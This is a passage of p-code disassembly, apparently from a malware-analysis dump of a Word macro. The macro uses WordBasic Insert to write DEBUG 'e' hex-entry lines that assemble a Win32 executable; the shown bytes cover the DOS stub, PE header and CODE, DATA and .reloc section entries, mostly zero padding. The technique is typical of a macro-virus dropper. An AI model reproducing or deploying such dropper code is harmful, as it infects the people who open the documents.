' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0140 ba 10 00 0e 1f b4 09 cd 21 b8 01 4c cd 21 90 90 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #11:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0150 54 68 69 73 20 70 72 6f 67 72 61 6d 20 6d 75 73 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #12:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0160 74 20 62 65 20 72 75 6e 20 75 6e 64 65 72 20 57 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #13:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0170 69 6e 33 32 0d 0a 24 37 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #14:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #15:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #16:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #17:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #18:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #19:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #20:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #21:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #22:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0200 50 45 00 00 4c 01 03 00 7e 26 3a aa 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #23:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0210 00 00 00 00 e0 00 8e 81 0b 01 02 19 00 16 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #24:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0220 00 04 00 00 00 00 00 00 00 10 00 00 00 10 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #25:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0230 00 30 00 00 00 00 40 00 00 10 00 00 00 02 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #26:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0240 01 00 00 00 00 00 00 00 03 00 0a 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #27:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0250 00 50 00 00 00 04 00 00 00 00 00 00 02 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #28:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0260 00 00 10 00 00 20 00 00 00 00 10 00 00 10 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #29:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0270 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #30:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #31:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #32:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02a0 00 40 00 00 a8 01 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #33:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #34:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #35:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #36:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #37:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02f0 00 00 00 00 00 00 00 00 43 4f 44 45 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #38:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0300 00 20 00 00 00 10 00 00 00 16 00 00 00 06 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #39:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0310 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 60 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #40:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0320 44 41 54 41 00 00 00 00 00 10 00 00 00 30 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #41:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0330 00 02 00 00 00 1c 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #42:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0340 00 00 00 00 40 00 00 c0 2e 72 65 6c 6f 63 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #43:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0350 00 10 00 00 00 40 00 00 00 02 00 00 00 1e 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #44:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0360 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 50 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #45:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #46:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #47:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #48:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #49:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #50:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #51:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #52:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #53:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #54:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #55:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #56:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #57:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #58:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #59:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #60:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #61:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #62:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #63:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #64:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
